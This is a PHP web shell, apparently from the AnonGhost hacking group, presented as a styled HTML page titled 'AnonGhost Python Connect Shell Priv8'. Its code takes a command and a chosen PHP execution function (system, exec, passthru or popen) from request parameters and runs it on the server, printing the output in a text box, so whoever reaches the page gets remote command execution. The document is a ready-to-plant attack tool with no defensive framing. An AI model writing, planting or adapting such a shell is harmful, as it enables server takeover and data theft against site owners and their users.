<html><head><title>AnonGhost Python Connect Shell Priv8</title><link rel="shortcut icon" href="http://www14.0zz0.com/2014/06/04/21/396554394.png" type="image/x-icon" /><style type="text/css">
h3 {
text-decoration: none;
  font-family: Tahoma, Arial, sans-serif;
  font-size: 10px;
  color: #0076B1;
  
}
.area {
  color: #0076B1;
  font-size: 9pt;
  text-shadow: #0076B1 0px 2px 7px;
  border: solid 1px #0076B1;
  background-color: transparent;
  box-shadow: 0px 0px 4px #009900;
  padding: 3px;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  border-radius: 4px;
  -webkit-box-shadow: rgb(0,119,0) 0px 0px ;
}
 input[type=submit]{ padding: 3px; color: #00770;
  font-weight: bold; 
text-align: center; 
 text-shadow: 0 1px rgba(255, 255, 255, 0.3);
  background: #aeaeae; 
 background-clip: padding-box; 
 border: 1px solid #284473; 
 border-bottom-color: #223b66; 
 border-radius: 4px;  
cursor: pointer;  
background-image:-webkit-linear-gradient(top, #eaeaea, #d0d0d0);
 background-image: -moz-linear-gradient(top, #eaeaea, #d0d0d0);
  background-image: -o-linear-gradient(top, #eaeaea, #d0d0d0); 
 background-image: linear-gradient(to bottom, #eaeaea, #d0d0d0); 
 -webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15);  box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); } 

input[type=text]{ padding: 3px; color: #0076B1; text-shadow: #0076B1 0px 0px 3px; border: 1px solid #0076B1; background: transparent; box-shadow: 0px 0px 4px #0076B1;    padding: 3px;   -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px;   -moz-box-shadow: #0076B1 0px 0px 4px;} 




</style>
<?php
echo '
<center>
<form method=GET>
<p><textarea class="area" rows="13" name="text" value="pyt" cols="70" >';


if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){
echo $_GET['execmethod']($_GET['command']);}
if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){
echo $_POST['execmethod']($_POST['command']);}

if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){
popen($_GET['command'],"r");}

echo'</textarea></p>
<p><center></center></p>
<p align="center"><strong></strong><input type=hidden name="vw" size="50" value="cmd"> <input type="text" name="command" size="43"> <select name=execmethod>
<option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select> <input type="submit" name="kkk" value="Execute">
</p></form>';

?>